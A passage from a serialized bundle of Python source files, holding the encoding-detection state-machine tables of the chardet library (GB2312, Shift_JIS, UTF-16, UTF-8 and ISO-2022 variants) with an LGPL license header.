MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.START,#10-17\n         4,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#18-1f\n    MachineState.ERROR,MachineState.ERROR,     5,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,#20-27\n    MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START #28-2f\n)\n\n# To be accurate, the length of class 6 can be either 2 or 4.\n# But it is not necessary to discriminate between the two since\n# it is used for frequency analysis only, and we are validating\n# each code range there as well. So it is safe to set it to be\n# 2 here.\nGB2312_CHAR_LEN_TABLE = (0, 1, 1, 1, 1, 1, 2)\n\nGB2312_SM_MODEL = {'class_table': GB2312_CLS,\n                   'class_factor': 7,\n                   'state_table': GB2312_ST,\n                   'char_len_table': GB2312_CHAR_LEN_TABLE,\n                   'name': 'GB2312'}\n\n# Shift_JIS\n\nSJIS_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17\n    1,1,1,0,1,1,1,1,  # 18 - 1f\n    1,1,1,1,1,1,1,1,  # 20 - 27\n    1,1,1,1,1,1,1,1,  # 28 - 2f\n    1,1,1,1,1,1,1,1,  # 30 - 37\n    1,1,1,1,1,1,1,1,  # 38 - 3f\n    2,2,2,2,2,2,2,2,  # 40 - 47\n    2,2,2,2,2,2,2,2,  # 48 - 4f\n    2,2,2,2,2,2,2,2,  # 50 - 57\n    2,2,2,2,2,2,2,2,  # 58 - 5f\n    2,2,2,2,2,2,2,2,  # 60 - 67\n    2,2,2,2,2,2,2,2,  # 68 - 6f\n    2,2,2,2,2,2,2,2,  # 70 - 77\n    2,2,2,2,2,2,2,1,  # 78 - 7f\n    3,3,3,3,3,2,2,3,  # 80 - 87\n    3,3,3,3,3,3,3,3,  # 88 - 8f\n    3,3,3,3,3,3,3,3,  # 90 - 97\n    3,3,3,3,3,3,3,3,  # 98 - 9f\n    #0xa0 is illegal in sjis encoding, but some pages does\n    #contain such byte. We need to be more error forgiven.\n    2,2,2,2,2,2,2,2,  # a0 - a7\n    2,2,2,2,2,2,2,2,  # a8 - af\n    2,2,2,2,2,2,2,2,  # b0 - b7\n    2,2,2,2,2,2,2,2,  # b8 - bf\n    2,2,2,2,2,2,2,2,  # c0 - c7\n    2,2,2,2,2,2,2,2,  # c8 - cf\n    2,2,2,2,2,2,2,2,  # d0 - d7\n    2,2,2,2,2,2,2,2,  # d8 - df\n    3,3,3,3,3,3,3,3,  # e0 - e7\n    3,3,3,3,3,4,4,4,  # e8 - ef\n    3,3,3,3,3,3,3,3,  # f0 - f7\n    3,3,3,3,3,0,0,0)  # f8 - ff\n\n\nSJIS_ST = (\n    MachineState.ERROR,MachineState.START,MachineState.START,     3,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#00-07\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START #10-17\n)\n\nSJIS_CHAR_LEN_TABLE = (0, 1, 1, 2, 0, 0)\n\nSJIS_SM_MODEL = {'class_table': SJIS_CLS,\n               'class_factor': 6,\n               'state_table': SJIS_ST,\n               'char_len_table': SJIS_CHAR_LEN_TABLE,\n               'name': 'Shift_JIS'}\n\n# UCS2-BE\n\nUCS2BE_CLS = (\n    0,0,0,0,0,0,0,0,  # 00 - 07\n    0,0,1,0,0,2,0,0,  # 08 - 0f\n    0,0,0,0,0,0,0,0,  # 10 - 17\n    0,0,0,3,0,0,0,0,  # 18 - 1f\n    0,0,0,0,0,0,0,0,  # 20 - 27\n    0,3,3,3,3,3,0,0,  # 28 - 2f\n    0,0,0,0,0,0,0,0,  # 30 - 37\n    0,0,0,0,0,0,0,0,  # 38 - 3f\n    0,0,0,0,0,0,0,0,  # 40 - 47\n    0,0,0,0,0,0,0,0,  # 48 - 4f\n    0,0,0,0,0,0,0,0,  # 50 - 57\n    0,0,0,0,0,0,0,0,  # 58 - 5f\n    0,0,0,0,0,0,0,0,  # 60 - 67\n    0,0,0,0,0,0,0,0,  # 68 - 6f\n    0,0,0,0,0,0,0,0,  # 70 - 77\n    0,0,0,0,0,0,0,0,  # 78 - 7f\n    0,0,0,0,0,0,0,0,  # 80 - 87\n    0,0,0,0,0,0,0,0,  # 88 - 8f\n    0,0,0,0,0,0,0,0,  # 90 - 97\n    0,0,0,0,0,0,0,0,  # 98 - 9f\n    0,0,0,0,0,0,0,0,  # a0 - a7\n    0,0,0,0,0,0,0,0,  # a8 - af\n    0,0,0,0,0,0,0,0,  # b0 - b7\n    0,0,0,0,0,0,0,0,  # b8 - bf\n    0,0,0,0,0,0,0,0,  # c0 - c7\n    0,0,0,0,0,0,0,0,  # c8 - cf\n    0,0,0,0,0,0,0,0,  # d0 - d7\n    0,0,0,0,0,0,0,0,  # d8 - df\n    0,0,0,0,0,0,0,0,  # e0 - e7\n    0,0,0,0,0,0,0,0,  # e8 - ef\n    0,0,0,0,0,0,0,0,  # f0 - f7\n    0,0,0,0,0,0,4,5   # f8 - ff\n)\n\nUCS2BE_ST  = (\n          5,     7,     7,MachineState.ERROR,     4,     3,MachineState.ERROR,MachineState.ERROR,#00-07\n     MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n     MachineState.ITS_ME,MachineState.ITS_ME,     6,     6,     6,     6,MachineState.ERROR,MachineState.ERROR,#10-17\n          6,     6,     6,     6,     6,MachineState.ITS_ME,     6,     6,#18-1f\n          6,     6,     6,     6,     5,     7,     7,MachineState.ERROR,#20-27\n          5,     8,     6,     6,MachineState.ERROR,     6,     6,     6,#28-2f\n          6,     6,     6,     6,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START #30-37\n)\n\nUCS2BE_CHAR_LEN_TABLE = (2, 2, 2, 0, 2, 2)\n\nUCS2BE_SM_MODEL = {'class_table': UCS2BE_CLS,\n                   'class_factor': 6,\n                   'state_table': UCS2BE_ST,\n                   'char_len_table': UCS2BE_CHAR_LEN_TABLE,\n                   'name': 'UTF-16BE'}\n\n# UCS2-LE\n\nUCS2LE_CLS = (\n    0,0,0,0,0,0,0,0,  # 00 - 07\n    0,0,1,0,0,2,0,0,  # 08 - 0f\n    0,0,0,0,0,0,0,0,  # 10 - 17\n    0,0,0,3,0,0,0,0,  # 18 - 1f\n    0,0,0,0,0,0,0,0,  # 20 - 27\n    0,3,3,3,3,3,0,0,  # 28 - 2f\n    0,0,0,0,0,0,0,0,  # 30 - 37\n    0,0,0,0,0,0,0,0,  # 38 - 3f\n    0,0,0,0,0,0,0,0,  # 40 - 47\n    0,0,0,0,0,0,0,0,  # 48 - 4f\n    0,0,0,0,0,0,0,0,  # 50 - 57\n    0,0,0,0,0,0,0,0,  # 58 - 5f\n    0,0,0,0,0,0,0,0,  # 60 - 67\n    0,0,0,0,0,0,0,0,  # 68 - 6f\n    0,0,0,0,0,0,0,0,  # 70 - 77\n    0,0,0,0,0,0,0,0,  # 78 - 7f\n    0,0,0,0,0,0,0,0,  # 80 - 87\n    0,0,0,0,0,0,0,0,  # 88 - 8f\n    0,0,0,0,0,0,0,0,  # 90 - 97\n    0,0,0,0,0,0,0,0,  # 98 - 9f\n    0,0,0,0,0,0,0,0,  # a0 - a7\n    0,0,0,0,0,0,0,0,  # a8 - af\n    0,0,0,0,0,0,0,0,  # b0 - b7\n    0,0,0,0,0,0,0,0,  # b8 - bf\n    0,0,0,0,0,0,0,0,  # c0 - c7\n    0,0,0,0,0,0,0,0,  # c8 - cf\n    0,0,0,0,0,0,0,0,  # d0 - d7\n    0,0,0,0,0,0,0,0,  # d8 - df\n    0,0,0,0,0,0,0,0,  # e0 - e7\n    0,0,0,0,0,0,0,0,  # e8 - ef\n    0,0,0,0,0,0,0,0,  # f0 - f7\n    0,0,0,0,0,0,4,5   # f8 - ff\n)\n\nUCS2LE_ST = (\n          6,     6,     7,     6,     4,     3,MachineState.ERROR,MachineState.ERROR,#00-07\n     MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n     MachineState.ITS_ME,MachineState.ITS_ME,     5,     5,     5,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,#10-17\n          5,     5,     5,MachineState.ERROR,     5,MachineState.ERROR,     6,     6,#18-1f\n          7,     6,     8,     8,     5,     5,     5,MachineState.ERROR,#20-27\n          5,     5,     5,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     5,     5,#28-2f\n          5,     5,     5,MachineState.ERROR,     5,MachineState.ERROR,MachineState.START,MachineState.START #30-37\n)\n\nUCS2LE_CHAR_LEN_TABLE = (2, 2, 2, 2, 2, 2)\n\nUCS2LE_SM_MODEL = {'class_table': UCS2LE_CLS,\n                 'class_factor': 6,\n                 'state_table': UCS2LE_ST,\n                 'char_len_table': UCS2LE_CHAR_LEN_TABLE,\n                 'name': 'UTF-16LE'}\n\n# UTF-8\n\nUTF8_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07  #allow 0x00 as a legal value\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17\n    1,1,1,0,1,1,1,1,  # 18 - 1f\n    1,1,1,1,1,1,1,1,  # 20 - 27\n    1,1,1,1,1,1,1,1,  # 28 - 2f\n    1,1,1,1,1,1,1,1,  # 30 - 37\n    1,1,1,1,1,1,1,1,  # 38 - 3f\n    1,1,1,1,1,1,1,1,  # 40 - 47\n    1,1,1,1,1,1,1,1,  # 48 - 4f\n    1,1,1,1,1,1,1,1,  # 50 - 57\n    1,1,1,1,1,1,1,1,  # 58 - 5f\n    1,1,1,1,1,1,1,1,  # 60 - 67\n    1,1,1,1,1,1,1,1,  # 68 - 6f\n    1,1,1,1,1,1,1,1,  # 70 - 77\n    1,1,1,1,1,1,1,1,  # 78 - 7f\n    2,2,2,2,3,3,3,3,  # 80 - 87\n    4,4,4,4,4,4,4,4,  # 88 - 8f\n    4,4,4,4,4,4,4,4,  # 90 - 97\n    4,4,4,4,4,4,4,4,  # 98 - 9f\n    5,5,5,5,5,5,5,5,  # a0 - a7\n    5,5,5,5,5,5,5,5,  # a8 - af\n    5,5,5,5,5,5,5,5,  # b0 - b7\n    5,5,5,5,5,5,5,5,  # b8 - bf\n    0,0,6,6,6,6,6,6,  # c0 - c7\n    6,6,6,6,6,6,6,6,  # c8 - cf\n    6,6,6,6,6,6,6,6,  # d0 - d7\n    6,6,6,6,6,6,6,6,  # d8 - df\n    7,8,8,8,8,8,8,8,  # e0 - e7\n    8,8,8,8,8,9,8,8,  # e8 - ef\n    10,11,11,11,11,11,11,11,  # f0 - f7\n    12,13,13,13,14,15,0,0    # f8 - ff\n)\n\nUTF8_ST = (\n    MachineState.ERROR,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     12,   10,#00-07\n         9,     11,     8,     7,     6,     5,     4,    3,#08-0f\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#10-17\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#18-1f\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#20-27\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#28-2f\n    MachineState.ERROR,MachineState.ERROR,     5,     5,     5,     5,MachineState.ERROR,MachineState.ERROR,#30-37\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#38-3f\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     5,     5,     5,MachineState.ERROR,MachineState.ERROR,#40-47\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#48-4f\n    MachineState.ERROR,MachineState.ERROR,     7,     7,     7,     7,MachineState.ERROR,MachineState.ERROR,#50-57\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#58-5f\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     7,     7,MachineState.ERROR,MachineState.ERROR,#60-67\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#68-6f\n    MachineState.ERROR,MachineState.ERROR,     9,     9,     9,     9,MachineState.ERROR,MachineState.ERROR,#70-77\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#78-7f\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     9,MachineState.ERROR,MachineState.ERROR,#80-87\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#88-8f\n    MachineState.ERROR,MachineState.ERROR,    12,    12,    12,    12,MachineState.ERROR,MachineState.ERROR,#90-97\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#98-9f\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,    12,MachineState.ERROR,MachineState.ERROR,#a0-a7\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#a8-af\n    MachineState.ERROR,MachineState.ERROR,    12,    12,    12,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#b0-b7\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#b8-bf\n    MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,#c0-c7\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR #c8-cf\n)\n\nUTF8_CHAR_LEN_TABLE = (0, 1, 0, 0, 0, 0, 2, 3, 3, 3, 4, 4, 5, 5, 6, 6)\n\nUTF8_SM_MODEL = {'class_table': UTF8_CLS,\n                 'class_factor': 16,\n                 'state_table': UTF8_ST,\n                 'char_len_table': UTF8_CHAR_LEN_TABLE,\n                 'name': 'UTF-8'}\n", "thirdparty/chardet/escsm.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .enums import MachineState\n\nHZ_CLS = (\n1,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,0,0,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17\n0,0,0,1,0,0,0,0,  # 18 - 1f\n0,0,0,0,0,0,0,0,  # 20 - 27\n0,0,0,0,0,0,0,0,  # 28 - 2f\n0,0,0,0,0,0,0,0,  # 30 - 37\n0,0,0,0,0,0,0,0,  # 38 - 3f\n0,0,0,0,0,0,0,0,  # 40 - 47\n0,0,0,0,0,0,0,0,  # 48 - 4f\n0,0,0,0,0,0,0,0,  # 50 - 57\n0,0,0,0,0,0,0,0,  # 58 - 5f\n0,0,0,0,0,0,0,0,  # 60 - 67\n0,0,0,0,0,0,0,0,  # 68 - 6f\n0,0,0,0,0,0,0,0,  # 70 - 77\n0,0,0,4,0,5,2,0,  # 78 - 7f\n1,1,1,1,1,1,1,1,  # 80 - 87\n1,1,1,1,1,1,1,1,  # 88 - 8f\n1,1,1,1,1,1,1,1,  # 90 - 97\n1,1,1,1,1,1,1,1,  # 98 - 9f\n1,1,1,1,1,1,1,1,  # a0 - a7\n1,1,1,1,1,1,1,1,  # a8 - af\n1,1,1,1,1,1,1,1,  # b0 - b7\n1,1,1,1,1,1,1,1,  # b8 - bf\n1,1,1,1,1,1,1,1,  # c0 - c7\n1,1,1,1,1,1,1,1,  # c8 - cf\n1,1,1,1,1,1,1,1,  # d0 - d7\n1,1,1,1,1,1,1,1,  # d8 - df\n1,1,1,1,1,1,1,1,  # e0 - e7\n1,1,1,1,1,1,1,1,  # e8 - ef\n1,1,1,1,1,1,1,1,  # f0 - f7\n1,1,1,1,1,1,1,1,  # f8 - ff\n)\n\nHZ_ST = (\nMachineState.START,MachineState.ERROR,     3,MachineState.START,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,# 00-07\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,# 08-0f\nMachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,     4,MachineState.ERROR,# 10-17\n     5,MachineState.ERROR,     6,MachineState.ERROR,     5,     5,     4,MachineState.ERROR,# 18-1f\n     4,MachineState.ERROR,     4,     4,     4,MachineState.ERROR,     4,MachineState.ERROR,# 20-27\n     4,MachineState.ITS_ME,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,# 28-2f\n)\n\nHZ_CHAR_LEN_TABLE = (0, 0, 0, 0, 0, 0)\n\nHZ_SM_MODEL = {'class_table': HZ_CLS,\n               'class_factor': 6,\n               'state_table': HZ_ST,\n               'char_len_table': HZ_CHAR_LEN_TABLE,\n               'name': \"HZ-GB-2312\",\n               'language': 'Chinese'}\n\nISO2022CN_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,0,0,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17\n0,0,0,1,0,0,0,0,  # 18 - 1f\n0,0,0,0,0,0,0,0,  # 20 - 27\n0,3,0,0,0,0,0,0,  # 28 - 2f\n0,0,0,0,0,0,0,0,  # 30 - 37\n0,0,0,0,0,0,0,0,  # 38 - 3f\n0,0,0,4,0,0,0,0,  # 40 - 47\n0,0,0,0,0,0,0,0,  # 48 - 4f\n0,0,0,0,0,0,0,0,  # 50 - 57\n0,0,0,0,0,0,0,0,  # 58 - 5f\n0,0,0,0,0,0,0,0,  # 60 - 67\n0,0,0,0,0,0,0,0,  # 68 - 6f\n0,0,0,0,0,0,0,0,  # 70 - 77\n0,0,0,0,0,0,0,0,  # 78 - 7f\n2,2,2,2,2,2,2,2,  # 80 - 87\n2,2,2,2,2,2,2,2,  # 88 - 8f\n2,2,2,2,2,2,2,2,  # 90 - 97\n2,2,2,2,2,2,2,2,  # 98 - 9f\n2,2,2,2,2,2,2,2,  # a0 - a7\n2,2,2,2,2,2,2,2,  # a8 - af\n2,2,2,2,2,2,2,2,  # b0 - b7\n2,2,2,2,2,2,2,2,  # b8 - bf\n2,2,2,2,2,2,2,2,  # c0 - c7\n2,2,2,2,2,2,2,2,  # c8 - cf\n2,2,2,2,2,2,2,2,  # d0 - d7\n2,2,2,2,2,2,2,2,  # d8 - df\n2,2,2,2,2,2,2,2,  # e0 - e7\n2,2,2,2,2,2,2,2,  # e8 - ef\n2,2,2,2,2,2,2,2,  # f0 - f7\n2,2,2,2,2,2,2,2,  # f8 - ff\n)\n\nISO2022CN_ST = (\nMachineState.START,     3,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,# 00-07\nMachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 08-0f\nMachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,# 10-17\nMachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     4,MachineState.ERROR,# 18-1f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 20-27\n     5,     6,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 28-2f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 30-37\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,MachineState.START,# 38-3f\n)\n\nISO2022CN_CHAR_LEN_TABLE = (0, 0, 0, 0, 0, 0, 0, 0, 0)\n\nISO2022CN_SM_MODEL = {'class_table': ISO2022CN_CLS,\n                      'class_factor': 9,\n                      'state_table': ISO2022CN_ST,\n                      'char_len_table': ISO2022CN_CHAR_LEN_TABLE,\n                      'name': \"ISO-2022-CN\",\n                      'language': 'Chinese'}\n\nISO2022JP_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,2,2,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17\n0,0,0,1,0,0,0,0,  # 18 - 1f\n0,0,0,0,7,0,0,0,  # 20 - 27\n3,0,0,0,0,0,0,0,  # 28 - 2f\n0,0,0,0,0,0,0,0,  # 30 - 37\n0,0,0,0,0,0,0,0,  # 38 - 3f\n6,0,4,0,8,0,0,0,  # 40 - 47\n0,9,5,0,0,0,0,0,  # 48 - 4f\n0,0,0,0,0,0,0,0,  # 50 - 57\n0,0,0,0,0,0,0,0,  # 58 - 5f\n0,0,0,0,0,0,0,0,  # 60 - 67\n0,0,0,0,0,0,0,0,  # 68 - 6f\n0,0,0,0,0,0,0,0,  # 70 - 77\n0,0,0,0,0,0,0,0,  # 78 - 7f\n2,2,2,2,2,2,2,2,  # 80 - 87\n2,2,2,2,2,2,2,2,  # 88 - 8f\n2,2,2,2,2,2,2,2,  # 90 - 97\n2,2,2,2,2,2,2,2,  # 98 - 9f\n2,2,2,2,2,2,2,2,  # a0 - a7\n2,2,2,2,2,2,2,2,  # a8 - af\n2,2,2,2,2,2,2,2,  # b0 - b7\n2,2,2,2,2,2,2,2,  # b8 - bf\n2,2,2,2,2,2,2,2,  # c0 - c7\n2,2,2,2,2,2,2,2,  # c8 - cf\n2,2,2,2,2,2,2,2,  # d0 - d7\n2,2,2,2,2,2,2,2,  # d8 - df\n2,2,2,2,2,2,2,2,  # e0 - e7\n2,2,2,2,2,2,2,2,  # e8 - ef\n2,2,2,2,2,2,2,2,  # f0 - f7\n2,2,2,2,2,2,2,2,  # f8 - ff\n)\n\nISO2022JP_ST = (\nMachineState.START,     3,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,# 00-07\nMachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 08-0f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,# 10-17\nMachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,# 18-1f\nMachineState.ERROR,     5,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     4,MachineState.ERROR,MachineState.ERROR,# 20-27\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     6,MachineState.ITS_ME,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,# 28-2f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,# 30-37\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 38-3f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,MachineState.START,MachineState.START,# 40-47\n)\n\nISO2022JP_CHAR_LEN_TABLE = (0, 0, 0, 0, 0, 0, 0, 0, 0, 0)\n\nISO2022JP_SM_MODEL = {'class_table': ISO2022JP_CLS,\n                      'class_factor': 10,\n                      'state_table': ISO2022JP_ST,\n                      'char_len_table': ISO2022JP_CHAR_LEN_TABLE,\n                      'name': \"ISO-2022-JP\",\n                      'language': 'Japanese'}\n\nISO2022KR_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,0,0,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17\n0,0,0,1,0,0,0,0,  # 18 - 1f\n0,0,0,0,3,0,0,0,  # 20 - 27\n0,4,0,0,0,0,0,0,  # 28 - 2f\n0,0,0,0,0,0,0,0,  # 30 - 37\n0,0,0,0,0,0,0,0,  # 38 - 3f\n0,0,0,5,0,0,0,0,  # 40 - 47\n0,0,0,0,0,0,0,0,  # 48 - 4f\n0,0,0,0,0,0,0,0,  # 50 - 57\n0,0,0,0,0,0,0,0,  # 58 - 5f\n0,0,0,0,0,0,0,0,  # 60 - 67\n0,0,0,0,0,0,0,0,  # 68 - 6f\n0,0,0,0,0,0,0,0,  # 70 - 77\n0,0,0,0,0,0,0,0,  # 78 - 7f\n2,2,2,2,2,2,2,2,  # 80 - 87\n2,2,2,2,2,2,2,2,  # 88 - 8f\n2,2,2,2,2,2,2,2,  # 90 - 97\n2,2,2,2,2,2,2,2,  # 98 - 9f\n2,2,2,2,2,2,2,2,  # a0 - a7\n2,2,2,2,2,2,2,2,  # a8 - af\n2,2,2,2,2,2,2,2,  # b0 - b7\n2,2,2,2,2,2,2,2,  # b8 - bf\n2,2,2,2,2,2,2,2,  # c0 - c7\n2,2,2,2,2,2,2,2,  # c8 - cf\n2,2,2,2,2,2,2,2,  # d0 - d7\n2,2,2,2,2,2,2,2,  # d8 - df\n2,2,2,2,2,2,2,2,  # e0 - e7\n2,2,2,2,2,2,2,2,  # e8 - ef\n2,2,2,2,2,2,2,2,  # f0 - f7\n2,2,2,2,2,2,2,2,  # f8 - ff\n)\n\nISO2022KR_ST = (\nMachineState.START,     3,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,# 00-07\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,# 08-0f\nMachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     4,MachineState.ERROR,MachineState.ERROR,# 10-17\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     5,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 18-1f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.START,MachineState.START,MachineState.START,MachineState.START,# 20-27\n)\n\nISO2022KR_CHAR_LEN_TABLE = (0, 0, 0, 0, 0, 0)\n\nISO2022KR_SM_MODEL = {'class_table': ISO2022KR_CLS,\n                      'class_factor': 6,\n                      'state_table': ISO2022KR_ST,\n                      'char_len_table': ISO2022KR_CHAR_LEN_TABLE,\n                      'name': \"ISO-2022-KR\",\n                      'language': 'Korean'}\n\n\n", 